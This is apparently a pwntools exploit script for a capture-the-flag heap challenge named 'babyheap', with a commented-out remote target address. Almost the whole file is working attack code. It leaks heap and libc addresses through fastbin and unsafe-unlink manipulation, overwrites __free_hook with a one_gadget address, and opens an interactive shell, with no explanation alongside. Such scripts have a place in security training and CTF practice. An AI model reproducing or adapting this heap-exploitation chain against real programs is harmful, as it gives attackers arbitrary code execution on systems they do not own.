from pwn import *

DEBUG=0

p=process('./babyheap',env={'LD_PRELOAD':'./libc.so.6'})
#p=remote('106.75.67.115',9999)
elf=ELF('./libc.so.6')

if DEBUG == 1:
  context.log_level='debug'
  gdb.attach(p)

def sd(content):
  p.send(content)

def sl(content):
  p.sendline(content)

def rv(content):
  p.recvuntil(content)

def alloc(index,content):
  rv('Choice:')
  sl('1')
  rv('Index:')
  sl(str(index))
  rv('Content:')
  sd(content)

def edit(index,content):
  rv('Choice:')
  sl('2')
  rv('Index:')
  sl(str(index))
  rv('Content:')
  sd(content)

def show(index):
  rv('Choice:')
  sl('3')
  rv('Index:')
  sl(str(index))

def free(index):
  rv('Choice:')
  sl('4')
  rv('Index:')
  sl(str(index))

oneshot=0x4526A
free_hook=elf.symbols['__free_hook']

#------------------------------
# leak, leak, step the first
alloc(0,p64(0)*3+p64(0x31))
alloc(1,'\n')
alloc(2,'\n')
alloc(3,'\n')
alloc(4, p64(0) + p64(0x31) + p64(0x602080 - 0x18) + p64(0x602080 - 0x10))
alloc(5, p64(0x30) + p64(0x30) + '\n')

free(1)
free(0)

show(0)
fake_addr=u64(p.recvline()[:-1].ljust(8,'\x00'))-0x10
log.info('fake addr:'+hex(fake_addr))

#-----------------------------
# get the fake addr and fool it!

edit(0,p64(fake_addr)+p64(0)*2+p64(0x31))
alloc(6,p64(0)+p64(0xa1)+'\n')
alloc(7,p64(0)+p64(0xa1)+'\n')
free(1)
show(1)
libc_base=u64(p.recvline()[:-1].ljust(8,'\x00'))-0x3c4b78
log.info('libc base:'+hex(libc_base))

#-----------------------------
# after unsafe_unlink 
# edit the __free_hook with one_gadget!

edit(4,p64(libc_base+free_hook)+'\n')
edit(1,p64(libc_base+oneshot)+'\n')

free(1)
p.interactive()
